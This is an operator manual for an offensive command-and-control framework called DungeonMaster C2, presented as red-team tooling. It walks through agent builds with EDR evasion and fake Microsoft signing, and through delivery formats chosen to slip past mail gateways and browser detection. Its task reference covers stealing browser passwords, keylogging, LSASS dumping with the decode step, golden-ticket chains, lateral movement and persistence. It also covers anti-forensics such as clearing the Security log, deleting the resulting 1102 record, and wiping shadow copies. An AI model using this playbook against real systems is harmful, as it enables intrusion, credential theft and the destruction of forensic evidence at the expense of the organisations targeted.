# DungeonMaster C2 — Operator Manual

**Last updated:** 2026-07-26

---

## Table of Contents

1. [Core Concepts](#1-core-concepts)
2. [Dashboard](#2-dashboard)
3. [Campaigns](#3-campaigns)
4. [Builds](#4-builds)
5. [Sessions](#5-sessions)
6. [Task Reference](#6-task-reference)
7. [OPSEC Notes](#7-opsec-notes)
8. [Troubleshooting](#8-troubleshooting)

---

## 1. Core Concepts

Everything in DungeonMaster flows through four objects:

| Object | What it is |
|---|---|
| **Campaign** | Engagement container. Holds client name, objective, and scope. All sessions and evidence are bucketed under a campaign. |
| **Build** | A compiled agent binary. Configuration (C2 host, sleep, features) is frozen at build time inside the binary. |
| **Session** | A live or historical agent registration. Created automatically when an agent first calls home. Carries the full host fingerprint. |
| **Task** | A command queued on the server and fetched by the agent on its next poll. All task output is stored as evidence. |

Typical engagement flow: **Create campaign → Build payload → Deploy agent → Interact via session → Queue tasks**

---

## 2. Dashboard

**URL: `/`**

The landing page after login. Two sections:

### Active Campaigns

Cards showing all active campaigns. Click any card to open the campaign detail page.

Click **+ NEW** to open the campaign creation modal. Fill in:

| Field | Required | Notes |
|---|---|---|
| Campaign Name | yes | Short engagement name. Example: `Op Iron Fox` |
| Client | yes | Client or target org name. Example: `Acme Corp` |
| Objective | no | Free-text engagement goal. Example: `Full domain compromise simulation` |
| Scope CIDRs | no | Comma-separated. Example: `10.10.10.0/24, 192.168.1.0/24` |
| Scope Domains | no | Comma-separated. Example: `corp.local, mail.acme.com` |

### Live Sessions

A table of all alive sessions across all campaigns. Auto-refreshes every 10 seconds.

| Column | Meaning |
|---|---|
| Host | Hostname reported by the agent |
| User | Username the agent is running as |
| OS | Operating system name |
| Priv | `SYSTEM` badge (red) if the token is elevated; dash otherwise |
| Last Seen | Time of the last beacon |
| (link) | **interact →** — opens the session console |

Sessions marked as dead do not appear here. Use the campaign page to review historical sessions.

---

## 3. Campaigns

**URL: `/campaigns/:id`**

Opens after clicking a campaign card from the dashboard.

### Layout

**Left panel — Sessions list**

Each row shows a dot (green = alive, gray = dead/stale), hostname, username, elevation badge, OS, and last-seen time. Click any row to open that session's console.

**Right panel — Event feed (320px)**

A real-time stream of everything happening in this campaign. Events are appended at the bottom; the feed holds the last 300 entries.

| Event type | Color | When it fires |
|---|---|---|
| `SESSION_CHECKIN` | green | Agent first registers or re-registers |
| `SESSION_REVOKED` | red | Operator sends kill / revokes session |
| `TASK_QUEUED` | blue | Operator queues a task |
| `TASK_OUTPUT` | light gray | Agent submits task output |
| `EVASION_DETECTED` | yellow | Agent triggers an evasion check mid-run |
| `BUILD_COMPLETE` | purple | An agent build finishes |
| `OPERATOR_JOINED` | dark gray | Another operator opens this campaign page |
| `OPERATOR_LEFT` | dark gray | Operator navigates away |

Each event line shows: timestamp / event type / first 8 chars of the session UUID where applicable.

### Example

Engagement: **Op Iron Fox** against **Acme Corp**

1. Dashboard → **+ NEW** → fill in name `Op Iron Fox`, client `Acme Corp`, scope `10.10.10.0/24`
2. Build page → create payload targeting this campaign (see [Builds](#4-builds))
3. Deploy the binary to a target host
4. Campaign page → session appears in the left panel within one sleep interval
5. Click the session row → session console opens

---

## 4. Builds

**URL: `/builds`**

### Payload Builder

The form on the left creates an agent binary with all configuration baked in. The build runs Docker-in-Docker and takes ~80 seconds on first compile (Rust with LTO). Subsequent builds with a warm layer cache are faster (~20–30 seconds).

| Field | Notes |
|---|---|
| **Campaign** | Dropdown of active campaigns. Ties this binary to the campaign — sessions created by this agent will auto-attach. |
| **Listener** | Dropdown of configured C2 listeners. The selected listener's host:port is compiled into the binary. Click **+ New Listener** if none exist. |
| **Sleep (sec)** | Base beacon interval. Default 30. The agent sleeps this many seconds between polls (with jitter applied). Minimum recommended for covert ops: 60. |
| **Jitter (%)** | Random ± percentage applied to each sleep. Default 20. At 30s/20%, actual sleep ranges 24–36 seconds. Breaks timing-based network pattern detection. |
| **Ephemeral** | Default on. No persistence mechanism is installed — the agent runs in the current process only. Disable to install a Run key on execution. |
| **TLS Skip Verify** | Default on for lab builds. Accepts self-signed certificates. Must be off for production. |
| **Sign Subject** | Optional. Specify a subject string to fake-sign the binary (e.g., `CN=Microsoft Windows,O=Microsoft Corporation,C=US`). Leave blank for unsigned. |

### Feature flags

Features are compiled in selectively. Enabling a feature increases binary size and functionality.

**Process Injection**

| Feature | What it enables |
|---|---|
| `inject-classic` | Classic remote thread injection (VirtualAllocEx + CreateRemoteThread) |
| `inject-apc` | Early-bird APC injection — spawn process suspended, queue APC |
| `inject-hollow` | Process hollowing — replace a suspended process's image with a PE payload |
| `inject-hijack` | Thread hijacking — suspend a thread, redirect RIP, resume |
| `inject-stomp` | Module stomping — overwrite a loaded DLL's .text section with shellcode |

**Evasion**

| Feature | What it enables |
|---|---|
| `ppid-spoof` | PPID spoofing — agent appears as a child of a specified legitimate process |
| `unhook` | ntdll unhooking — restore ntdll from a clean copy to bypass EDR hooks |
| `heap-encrypt` | Encrypt agent heap during sleep to reduce memory scanner detections |
| `stack-spoof` | Spoof call stack during sleep to defeat stack-based thread scanning |

**Loader / Lifecycle**

| Feature | What it enables |
|---|---|
| `udrl` | Reflective loader — agent loads itself from a raw memory buffer with no PE loader visible |
| `process-hollow` | Hollow into a trusted process on launch (requires `udrl`) |
| `dll-sideload` | Compiles the agent as `version.dll` for a signed-EXE bundle delivery |
| `self-delete` | Agent deletes its own binary from disk on cleanup |

### Delivery formats

When a build completes, three download buttons appear. Each is a different loader wrapper around the same compiled agent:

| Button | Format | When to use |
|---|---|---|
| **↓ hta** | MSHTA loader | No `.exe` extension, runs via `mshta.exe`. Useful when `.exe` attachment delivery is blocked by mail gateways. |
| **↓ ps1** | PowerShell cradle | In-memory only, no `.exe` dropped to disk. Best for environments with process-based execution controls. Requires PowerShell execution. |
| **↓ js** | WScript wrapper | Breaks the Chrome → `.exe` parent chain that triggers ATD (automated threat detection) on browser-delivered executables. |

### Build status

| Status | Color | Meaning |
|---|---|---|
| `queued` | yellow | Build record created, Docker job not yet picked up |
| `building` | yellow | Docker build in progress |
| `complete` | green | Binary ready, delivery links active |
| `failed` | red | Build failed; check server logs for the Docker error |

### Creating a listener

Click **+ New Listener** in the listener dropdown if the list is empty. Fields:

| Field | Default | Notes |
|---|---|---|
| Name | — | Display name only. Example: `Lab HTTPS C2` |
| Bind Host | `0.0.0.0` | Address the C2 listener binds to inside the server container. Usually left as `0.0.0.0`. |
| Bind Port | `4443` | Port agents connect to. Must be reachable from the target. |
| Callback Host | — | Hostname or IP compiled into agent binaries. Set to the redirector hostname for production. Leave blank to use Bind Host. |
| Type | `https` | Protocol. Currently only HTTPS is implemented. |

---

## 5. Sessions

**URL: `/sessions/:sessionId` or `/campaigns/:id/sessions/:sessionId`**

The session console is the primary interactive interface. Open it from the Live Sessions table on the dashboard or from the campaign's session list.

### Top bar

| Element | Meaning |
|---|---|
| Green / gray dot | `is_alive` status. Flips dead if the agent misses 5× its sleep interval. |
| **Hostname** | Reported by the agent on registration. |
| `username@domain` | Domain shown only if non-empty. |
| `ELEVATED` badge | Token has admin/SYSTEM privileges. |
| `REVOKED` badge | Session has been revoked — agent will exit on next poll. |
| OS / arch / version | e.g., `windows x86_64 10.0.19045` |
| Channel · sleep · jitter | Active channel type and current beacon timing. |
| **revoke** button | Sends a kill signal — agent exits cleanly on next poll. |

**EDR/AV warning bar:** If the agent detected security products during its initial fingerprint scan, a yellow bar below the top bar lists the process names found. Informational only.

### Quick actions toolbar

The row of controls below the top bar:

| Control | Action |
|---|---|
| **TASKS** | Opens the task builder modal — the full menu of all 69 task methods. |
| **SUMMARY** | Runs `enum/computer`, `enum/processes`, and `enum/users` in parallel. Results appear as rich panels in the output area. |
| **SLEEP [n] s ± [n] % SET** | Edit the two number inputs and click **SET** to update the agent's beacon interval on the fly. Takes effect on the agent's next poll. |
| **KILL** | Sends a kill task. Agent exits after processing any pending tasks. Prompts for confirmation first. |

### Task builder

Click **TASKS** to open the task builder modal. Tasks are organized into categories in the left sidebar. Select a category, then select the specific method. Fill in any required arguments and click **Queue Task**.

The modal closes after queuing. Output appears in the session output area once the agent polls and executes the task.

### Output area

The output area renders task results. Rich rendering is applied automatically based on content type:

- **Tables** — TSV output (from `enum/processes`, `enum/services`, etc.) renders as a formatted table
- **JSON** — structured JSON output renders as a collapsible tree
- **Images** — screenshots render inline as images
- **Raw text** — all other output displays as plain text

If a task has not returned output within 2 minutes (120 seconds / 60 poll attempts at 2s each), the UI prints a timeout message. The task is NOT lost — it will execute when the agent next polls and output will be stored in evidence. Reduce sleep to 5s for interactive work.

### Host fingerprint

The right panel shows the session fingerprint captured at registration:

- Hostname, username, domain
- OS name, architecture, version
- Internal IPs
- Detected EDR / AV products
- Build UUID (which payload was deployed)
- Campaign association
- First seen / last seen timestamps

### Evidence

Every task result is stored in MinIO at `evidence/{session_id}/{task_id}.bin`. Access via:

- **MinIO console:** `http://localhost:9001` — browse the `evidence` bucket
- **Presigned URL:** generated at task completion; stored in the database

---

## 6. Task Reference

Tasks are queued through the TASKS modal and fetched by the agent on its next poll. Up to 10 queued tasks are dispatched per poll cycle.

### Task lifecycle

```
queued  →  sent  →  complete
                  →  failed
       →  cancelled  (cancelled before agent fetches)
```

### Quick reference

| Type | Methods |
|---|---|
| `shell` | *(no method)* — raw command via cmd.exe |
| `file` | `ls` `read` `write` `rm` `mkdir` `mv` `cp` `info` |
| `enum` | `processes` `services` `tasks` `sessions` `shares` `users` `groups` `localadmins` `computer` `domain` `routes` `netdiscovery` `bloodhound` `acl` `unconstrained-deleg` |
| `collect` | `clipboard` `dpapi` `vault` `wifi` `browser-creds` `browser-history` `file-search` `screen-record` `keylog-start` `keylog-stop` `keylog-dump` `ssh-keys` `certs` `email` |
| `priv` | `sam-dump` `token-steal` `token-make` `potato` `pipe-impersonate` `uac-fodhelper` `uac-eventvwr` `uac-sdclt` `unquoted-paths` `dll-hijack` `always-install-elevated` `shadow-creds` `rbcd` `adcs` `acl-abuse` `s4u` |
| `lateral` | `smb-psexec` `wmi` `winrm` `dcom` `rdp-pth` `adidns` |
| `persist` | `reg` `reg-rm` `task` `svc` `svc-rm` `startup` `com` `wmi` |
| `antifor` | `timestomp` `indicator-rm` `eventlog-clear` `eventlog-del` `shadow-delete` |
| `cred` | `lsass` `lsass-pss` `lsass-syscall` `kerberoast` `asrep-roast` `ptt` `pth` `opth` `dcsync` `golden-ticket` `silver-ticket` `diamond-ticket` |
| `inject` | `classic` `apc` `classic-spawn` `hollow` `hijack` `stomp` |
| `sleep` | *(no method)* — update beacon interval |
| `kill` | *(no method)* — terminate agent |
| `screenshot` | *(no method)* — capture desktop |
| `upload` | *(no method)* — read file from target |
| `download` | *(no method)* — write file to target |
| `relay_start` / `relay_stop` | SMB relay chain through a named pipe |

---

### `shell`

Execute a command via `cmd /C`. No PTY — use for single-shot commands only. Interactive programs (ssh, powershell remoting) will not work.

**Args:** `{"cmd": "whoami /all"}`

**Output:** Combined stdout + stderr.

**Examples:**
- `whoami /all` — current user, SID, group memberships
- `ipconfig /all` — full network config
- `net localgroup administrators` — local admin members
- `systeminfo` — full OS and patch info
- `net user /domain` — domain users (requires domain context)
- `reg query HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run` — autorun keys

---

### `sleep`

Update the agent's beacon interval without restarting. Prefer the SET button in the toolbar — this task is the underlying mechanism.

**Args:** `{"seconds": 60}`

**Output:** `"sleep updated"`

---

### `kill`

Terminate the agent. No args. Agent exits after acknowledging the task and processing any tasks ahead of it in the queue.

---

### `screenshot`

Capture the current desktop. No args.

**Output:** Raw BMP bytes, rendered inline as an image in the output area.

---

### `upload`

Read a file from the target and store it as evidence.

**Args:** `{"path": "C:\\Users\\target\\Documents\\passwords.xlsx"}`

**Output:** Raw file bytes stored as evidence in MinIO.

---

### `download`

Write a file to the target host.

**Args:** `{"path": "C:\\Windows\\Temp\\tool.exe", "data": "<base64 file bytes>"}`

**Output:** `"written N bytes to path"`

---

### `file` — File Manager

| Method | Required args | Optional args | Output |
|---|---|---|---|
| `ls` | — | `path` (default `.`) | One entry per line: name padded to 50 chars + `<DIR>` or size |
| `read` | `path` | — | Base64-encoded file bytes |
| `write` | `path`, `data` (base64) | — | `"written N bytes to path"` |
| `rm` | `path` | — | `"removed {path}"` |
| `mkdir` | `path` | — | `"created {path}"` |
| `mv` | `src`, `dst` | — | `"moved src -> dst"` |
| `cp` | `src`, `dst` | — | `"copied N bytes: src -> dst"` |
| `info` | `path` | — | Multi-line: path, type, size, readonly |

**Examples:**
- `ls` on `C:\Users` — enumerate user home directories
- `ls` on `C:\Program Files` — see installed applications
- `read` on `C:\Windows\System32\drivers\etc\hosts` — read hosts file
- `info` on a suspicious path — check file size, timestamps, read-only flag

---

### `enum` — Enumeration

#### Host enumeration

| Method | Required args | Optional args | Output |
|---|---|---|---|
| `processes` | — | — | TSV: `PID\tPPID\tThreads\tName` |
| `services` | — | — | TSV: `Name\tDisplayName\tStatus\tPID` |
| `tasks` | — | — | One scheduled task path per line |
| `sessions` | — | — | TSV: `Client\tUser\tTime(s)\tIdleTime(s)` |
| `shares` | — | `host` (default: localhost) | TSV: `Share\tType\tRemark` |
| `users` | — | `host` | One username per line |
| `groups` | — | — | One group name per line |
| `localadmins` | — | — | One member per line |
| `computer` | — | — | Full host profile: hostname, OS, arch, patches, AV |
| `domain` | — | — | Domain trusts + workstation config |
| `routes` | — | — | TSV: `Dest/Prefix\tNextHop\tIfIndex\tMetric` |
| `netdiscovery` | `target` (CIDR or host) | `ports` (csv, default: common), `timeout_ms` (default: 300) | TSV: `Host\tPort\tStatus` (open only) |

**Examples:**
- `computer` — first task to run on a new session; gives you OS, patch level, and any detected AV/EDR
- `processes` — find processes to inject into or identify security tools
- `netdiscovery` on `10.10.10.0/24` — discover what's alive on the subnet
- `netdiscovery` on `10.10.10.1` with `ports=445,3389,22` — targeted port check

#### AD enumeration (requires domain context)

| Method | Required args | Optional args | Output |
|---|---|---|---|
| `bloodhound` | — | `domain`, `dc`, `user`, `pass` | JSON: users, computers, groups, trusts, GPOs, CAs + stats |
| `acl` | — | `domain`, `dc`, `user`, `pass` | JSON: AD objects with their ACEs and rights |
| `unconstrained-deleg` | — | `domain`, `dc`, `user`, `pass` | JSON: computers and users with unconstrained delegation |

For AD methods, `domain` defaults to `%USERDNSDOMAIN%` and `dc` defaults to the domain FQDN. Pass `user`/`pass` explicitly if the current session doesn't have LDAP access.

**Example — BloodHound data collection:**
Run `bloodhound` from a domain-joined session. The output is a full AD snapshot compatible with BloodHound's JSON import. Download the evidence file from MinIO and load it into BloodHound for attack path visualization.

---

### `collect` — Collection

| Method | Required args | Optional args | Output |
|---|---|---|---|
| `clipboard` | — | — | Clipboard text (or empty message) |
| `dpapi` | `blob` (base64 DPAPI blob) | — | Decrypted plaintext bytes |
| `vault` | — | — | TSV: `Target\tUsername\tSecret` |
| `wifi` | — | — | `SSID: name\tKey: pass` per profile |
| `browser-creds` | — | `browser` (`chrome`/`edge`/`brave`, default: `chrome`) | TSV: `URL\tUsername\tPassword` |
| `browser-history` | — | `browser`, `limit` (default: 100) | TSV: `URL\tTitle\tVisitCount` |
| `file-search` | — | `path` (default: `C:\Users`), `pattern` (default: `*.txt`), `grep`, `max` (default: 200) | One matching path per line |
| `screen-record` | — | `count` (default: 5), `interval_ms` (default: 3000) | JSON array of base64 BMP strings |
| `keylog-start` | — | — | `"keylog: started"` |
| `keylog-stop` | — | — | `"keylog: stopped"` |
| `keylog-dump` | — | — | Captured keystrokes (cleared after dump) |
| `ssh-keys` | — | — | JSON: ssh_files (path, size, content_b64), putty_sessions |
| `certs` | — | — | JSON: certs from MY/CA/ROOT stores + PFX export |
| `email` | — | — | JSON: PST/OST/NST files (path, size) |

**Examples:**
- `browser-creds` — highest-yield credential collection on workstation sessions
- `vault` — Windows Credential Manager entries; often contains RDP passwords, VPN creds
- `keylog-start` → wait → `keylog-dump` → `keylog-stop` — capture a login sequence
- `file-search` with `pattern=*.kdbx` — find KeePass databases
- `file-search` with `pattern=*.pem,*.key` and `path=C:\Users` — find private keys
- `screen-record` with `count=10, interval_ms=5000` — passive desktop observation at 5-second intervals

---

### `priv` — Privilege Escalation

#### Local privilege escalation

| Method | Required args | Optional args | Notes |
|---|---|---|---|
| `sam-dump` | — | — | Dumps SAM/SYSTEM/SECURITY hives as base64. Needs SeBackupPrivilege or local admin. |
| `token-steal` | — | `spawn` (exe path) | Steals SYSTEM token. Without `spawn`: impersonates in-place. With `spawn`: launches exe as SYSTEM. |
| `token-make` | `user`, `pass` | `domain` (default `.`) | Creates logon token from explicit creds and impersonates. |
| `potato` | — | `cmd` | RogueWinRM / schtasks DCOM trigger to get SYSTEM impersonation. |
| `pipe-impersonate` | — | — | Opens a named pipe and impersonates the first privileged client. Waits up to 60 seconds. |
| `uac-fodhelper` | `cmd` | — | UAC bypass via ms-settings shell handler. |
| `uac-eventvwr` | `cmd` | — | UAC bypass via mmc application association. |
| `uac-sdclt` | `cmd` | — | UAC bypass via sdclt.exe isolation provider. |
| `unquoted-paths` | — | — | Scans services for unquoted paths with spaces. Reports writable hijack locations. |
| `dll-hijack` | — | — | Finds writable %PATH% dirs and missing DLL targets. |
| `always-install-elevated` | — | — | Checks both HKLM and HKCU AlwaysInstallElevated keys. Reports `[VULNERABLE]` if set. |

**Examples:**
- From a medium-integrity session: try `uac-fodhelper` or `uac-eventvwr` with `cmd=C:\Windows\Temp\agent.exe` to re-execute the agent elevated
- On a service account with `SeImpersonatePrivilege`: run `potato` to get SYSTEM
- After gaining SYSTEM: `token-steal` without `spawn` to impersonate SYSTEM in-process, then `sam-dump`

#### AD privilege escalation (requires domain context)

| Method | Required args | Optional args | Notes |
|---|---|---|---|
| `shadow-creds` | `target` (sAMAccountName) | `domain`, `dc`, `user`, `pass`, `remove` (bool) | Adds/removes msDS-KeyCredentialLink. Output includes public/private key pair for follow-on auth. |
| `rbcd` | `target`, `attacker_sid` | `domain`, `dc`, `user`, `pass`, `remove` (bool) | Writes msDS-AllowedToActOnBehalfOfOtherIdentity. Use with `priv/s4u` for follow-on exploitation. |
| `adcs` | — | `domain`, `dc`, `user`, `pass` | Enumerates certificate templates for ESC1/2/3/9/10. Returns vulnerable templates with severity ratings. |
| `acl-abuse` | `target` | `action` (`add`/`list`, default `add`), `trustee_sid`, `right` (`write-dacl`/`generic-all`/`dcsync`/etc.), `domain`, `dc`, `user`, `pass` | Appends ACE to target object DACL. Use `list` to view existing ACEs first. |
| `s4u` | — | `domain`, `dc`, `user`, `pass`, `target` | Enumerates constrained delegation (msDS-AllowedToDelegateTo). Identifies S4U2Self / S4U2Proxy abuse paths. |

**Examples:**
- Run `adcs` first — ESC1 is the most common misconfiguration and grants immediate domain admin if a vulnerable template exists
- `rbcd` requires GenericWrite on a computer object: set `target=DC01$`, `attacker_sid=<SID of attacker-controlled computer>`, then `s4u` to delegate and obtain a service ticket

---

### `lateral` — Lateral Movement

| Method | Required args | Optional args | Notes |
|---|---|---|---|
| `smb-psexec` | `host`, `cmd` | `timeout_s` (default 30), `task_name` | Service-based exec via SCM. Returns command output. Runs as SYSTEM. |
| `wmi` | `host`, `cmd` | `user`, `pass` | Win32_Process.Create via WMI. Fire-and-forget if no output redirect in cmd. |
| `winrm` | `host`, `cmd` | `user`, `pass` | winrs execution. Requires WinRM enabled on target. |
| `dcom` | `host`, `cmd` | `user`, `pass` | DCOM execution (routes through WMI path). Fire-and-forget. |
| `rdp-pth` | `host` | `user`, `domain`, `pass`, `check_only` (bool) | RDP via Restricted Admin mode. Use `check_only=true` to probe without connecting. |
| `adidns` | `action` (`add`/`remove`/`list`) | `name`, `ip` (required for add), `zone`, `ttl`, `domain`, `dc`, `user`, `pass` | Manage AD-Integrated DNS records for rogue A records / relay attacks. |

**Examples:**
- `smb-psexec` on `host=10.10.10.5, cmd=C:\Windows\Temp\agent.exe` — land an agent on an adjacent host as SYSTEM
- `winrm` on `host=DC01, cmd=hostname` — test lateral movement to the DC before deploying
- `rdp-pth` with `check_only=true` — verify Restricted Admin mode is enabled before trying a full RDP connection
- `adidns` with `action=add, name=wpad, ip=<attacker IP>` — poison WPAD for NTLM relay

---

### `persist` — Persistence

| Method | Required args | Optional args | Notes |
|---|---|---|---|
| `reg` | `name`, `path` | `hive` (`hkcu`/`hklm`, default `hkcu`) | Adds Run key entry. |
| `reg-rm` | `name` | `hive` (default `hkcu`) | Removes Run key entry. |
| `task` | `name`, `path` | `trigger` (default `ONLOGON`), `user` (default `SYSTEM`) | Creates scheduled task via schtasks. |
| `svc` | `name`, `path` | `display` | Creates and starts a Windows service. |
| `svc-rm` | `name` | — | Stops and deletes a service. |
| `startup` | `src`, `name` | — | Copies file into user startup folder. |
| `com` | `clsid`, `dll` | — | Hijacks COM CLSID InprocServer32/LocalServer32. |
| `wmi` | `name`, `cmd` | — | Creates WMI event subscription for persistence. |

**Examples:**
- `reg` with `hive=hkcu` — low-privilege, user-space. Survives reboot, removed by `reg-rm`.
- `task` with `trigger=ONLOGON, user=SYSTEM` — highest-privilege persistence. Requires admin. Most visible in scheduled tasks list.
- `svc` — creates a service entry; most forensically detectable but survives reinstalls. Clean up with `svc-rm`.
- `wmi` persistence — `name=WindowsUpdate, cmd=C:\Windows\Temp\agent.exe` — uses WMI event subscription; less common, harder to enumerate than Run keys or services.

---

### `antifor` — Anti-Forensics

| Method | Required args | Optional args | Notes |
|---|---|---|---|
| `timestomp` | `path` | `created`, `modified`, `accessed` (format: `YYYY-MM-DD HH:MM:SS`), `copy_from` | Modifies NTFS timestamps. Use `copy_from` to clone timestamps from a reference file. |
| `indicator-rm` | `path` | — | Zero-fills then deletes the file. |
| `eventlog-clear` | — | `channel` (default `Security`) | Clears a Windows event log channel. |
| `eventlog-del` | `record_id` | `channel` (default `Security`) | Removes a single event record by ID. |
| `shadow-delete` | — | — | Deletes all VSS shadow copies via vssadmin. |

**Examples:**
- `timestomp` with `copy_from=C:\Windows\System32\notepad.exe` — clone timestamps from a known-clean system file to make a dropped tool look native
- `indicator-rm` on a dropped binary after injection — zero-fill removes content even if filesystem forensics capture the inode
- `eventlog-clear` with `channel=Security` — clear the Security event log after a noisy operation. Note: the clear action itself logs Event ID 1102 unless the log is already at max size. Follow with `eventlog-del` to remove record 1102.
- `shadow-delete` — run before ransomware simulation or on engagement cleanup if persistence-free exit is required

---

### `cred` — Credential Access

#### LSASS dumps

All three methods require local admin. Output is XOR-encoded MDMP bytes — decode with `output[i] ^= (i & 0xFF)`. Feed the decoded file to Mimikatz: `sekurlsa::minidump output.dmp` → `sekurlsa::logonpasswords`.

| Method | Notes |
|---|---|
| `lsass` | Direct MiniDumpWriteDump. Highest EDR signal. **Blocked by Windows Defender behavioral detection.** |
| `lsass-pss` | PssCaptureSnapshot API. Lower EDR signal than direct OpenProcess. |
| `lsass-syscall` | Indirect NT syscalls. Bypasses EDR hooks on OpenProcess / ReadProcessMemory. |

**Typical escalation — start with `lsass-syscall`, fall back to `lsass-pss`, only try `lsass` if both fail and EDR is absent.**

#### Kerberos attacks

| Method | Required args | Optional args | Notes |
|---|---|---|---|
| `kerberoast` | — | `domain`, `dc`, `user`, `pass` | Returns TGS tickets for SPN accounts. Crack offline with hashcat mode 13100. |
| `asrep-roast` | — | `domain`, `dc`, `user`, `pass` | Finds pre-auth disabled accounts and returns AS-REP hashes. Crack with hashcat mode 18200. |
| `ptt` | `ticket_b64` (kirbi) | `purge` (bool) | Injects a Kerberos ticket into the current logon session. |
| `pth` | `user`, `pass` | `domain` (default `.`), `cmd` (default `cmd.exe`) | Pass-the-Hash via CreateProcessWithLogonW. Spawns a process for network auth. |
| `opth` | `domain`, `user`, `ntlm` (32-char hex) | `aes256_key` (64-char hex), `dc`, `cmd` | Overpass-the-Hash. Sends raw AS-REQ to DC:88, injects the returned TGT. |
| `dcsync` | — | `user` (target account, default `krbtgt`), `domain`, `dc`, `bind_user`, `bind_pass` | Verifies DCSync capability and retrieves target account LDAP attributes. |
| `golden-ticket` | `domain`, `sid`, `krbtgt_ntlm` | `username`, `user_id`, `lifetime_hours`, `groups` | Forges a Golden TGT offline. No DC contact. Pass `ticket_b64` output to `cred/ptt`. |
| `silver-ticket` | `domain`, `sid`, `service_ntlm`, `target` | `service` (default `cifs`), `username`, `user_id`, `lifetime_hours`, `groups` | Forges a Silver TGS for a specific service. No DC contact. Pass to `cred/ptt`. |
| `diamond-ticket` | `domain`, `sid`, `krbtgt_ntlm` | `groups`, `lifetime_hours`, `username` | Like a Golden Ticket but using the current user's real identity. Harder to detect. |

**Typical Kerberos attack chain:**

```
1. cred/dcsync              → verify DCSync rights on the session
2. cred/kerberoast          → collect TGS hashes for SPN accounts → crack offline (hashcat -m 13100)
3. cred/dcsync user=krbtgt  → pull krbtgt NTLM hash after gaining DCSync
4. cred/golden-ticket       → forge TGT for any user using krbtgt hash
5. cred/ptt ticket_b64=...  → inject the forged ticket into the current session
6. lateral/smb-psexec       → move to any host as the impersonated user
```

**pth example:**
`user=Administrator, pass=aad3b435b51404eeaad3b435b51404ee:8d3c6e1bc3a2c9dc4932bd3b7c7e89a7, cmd=C:\Windows\Temp\agent.exe` — spawn the agent with the harvested hash for NTLM network auth on lateral movement.

---

### `inject` — Process Injection

| Method | Required args | Optional args | Notes |
|---|---|---|---|
| `classic` | `pid`, `shellcode` (base64) | — | VirtualAllocEx + WriteProcessMemory + CreateRemoteThread |
| `apc` | `target` (exe path), `shellcode` (base64) | — | Spawn process suspended, queue early-bird APC to all threads, resume |
| `classic-spawn` | `target` (exe path), `shellcode` (base64) | — | Spawn new process + classic remote thread injection |
| `hollow` | `target` (exe path), `payload` (base64 PE) | — | Process hollowing — replaces image of suspended process with a PE |
| `hijack` | `pid`, `shellcode` (base64) | — | Suspend an existing thread, redirect RIP to shellcode, resume |
| `stomp` | `pid`, `shellcode` (base64) | — | Overwrite loaded DLL .text section. Requires `inject-stomp` feature flag at build time. |

**Examples:**
- `classic` into PID 1234 (e.g., explorer.exe) — simplest injection; detectable by most EDRs via OpenProcess signal
- `apc` with `target=C:\Windows\System32\svchost.exe` — early-bird APC into a freshly spawned svchost; lower detection signal than `classic`
- `hollow` with `target=C:\Windows\System32\notepad.exe` — the target process is replaced entirely; parent process chain and image name appear legitimate

**Choosing a method:**
- No EDR present → `classic` or `classic-spawn`
- EDR present but no kernel-level protection → `apc` or `hijack`
- Behavioral detection on memory allocation → `stomp` (requires feature flag)
- Need a clean parent process chain → `hollow` with a trusted binary as target

---

### `relay_start` / `relay_stop` — SMB Relay Chain

Chain a downstream implant through this agent over a named pipe. Used to route C2 traffic from a host that cannot reach the internet through a host that can.

**relay_start args:**

| Field | Required | Notes |
|---|---|---|
| `pipe` | yes | Named pipe name (e.g., `svcctl`) |
| `c2_host` | yes | Upstream C2 hostname or IP |
| `c2_port` | yes | Upstream C2 port |
| `reg_path` | no | Agent registration path (default `/r`) |
| `poll_path` | no | Agent poll path (default `/c`) |

**relay_stop:** No args. Stops the active relay.

**Example:** Agent on HOST-A (internet access) starts a relay on pipe `svcctl`. Downstream agent on HOST-B (no internet) connects to `\\HOST-A\pipe\svcctl` for all C2 communication.

---

## 7. OPSEC Notes

### What the agent does to avoid detection

**Pre-flight checks (run once at startup, before any network contact):**

1. **Sandbox artifact detection:** Checks `USERNAME` and `COMPUTERNAME` against known sandbox strings: `sandbox`, `analyst`, `maltest`, `test`, `virus`, `av`, `malware` (username); `sandbox`, `analysis`, `virus`, `malware`, `cuckoo` (hostname). Case-insensitive substring match. If triggered: silently return from `main()`.

2. **Process count check:** If fewer than 30 processes are running, the environment is likely a sandbox. If triggered: silently exit.

3. **System uptime check:** If uptime is under 5 minutes, the machine was freshly booted — sandbox indicator. If triggered: silently exit.

**In-loop checks (run every poll cycle):**

4. **Debugger detection:** Calls `IsDebuggerPresent()`. If a debugger is attached: silently exit.

5. **Analysis tool detection:** Checks for: `wireshark.exe`, `procmon.exe`, `procmon64.exe`, `processhacker.exe`, `x64dbg.exe`, `x32dbg.exe`, `ollydbg.exe`, `ida.exe`, `ida64.exe`, `idag.exe`, `idat.exe`, `autoruns.exe`, `autoruns64.exe`, `fiddler.exe`, `burpsuite.exe`, `dnspy.exe`, `dotpeek64.exe`. If any found: silently exit and report an `EVASION_DETECTED` event.

**Network profile:**

- Chrome user-agent: `Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36`
- Agent registration and poll use generic paths `/r` and `/c`
- TLS 1.3 minimum

**Binary profile:**

- No console window
- Debug symbols stripped, LTO enabled, size-optimized
- No output on failure — all error paths silently return
- ECDH key exchange on registration

### EDR/AV fingerprint reporting

The agent enumerates processes at registration and populates `edr_detected` and `av_detected` in the session fingerprint. Surfaced as the yellow warning bar in the session console.

**EDR processes checked:** CrowdStrike (`csagent.exe`, `csfalconservice.exe`), SentinelOne (`sentinelagent.exe`, `sentineld.exe`), Carbon Black (`cbagent.exe`, `cbtool.exe`), Cortex XDR (`cyserver.exe`, `cympprocess.exe`), Cylance (`cylancesvc.exe`), Defender ATP (`mssense.exe`, `sensecncproxy.exe`), Elastic (`elastic-agent.exe`, `elastic-endpoint.exe`), Tanium (`taniumclient.exe`).

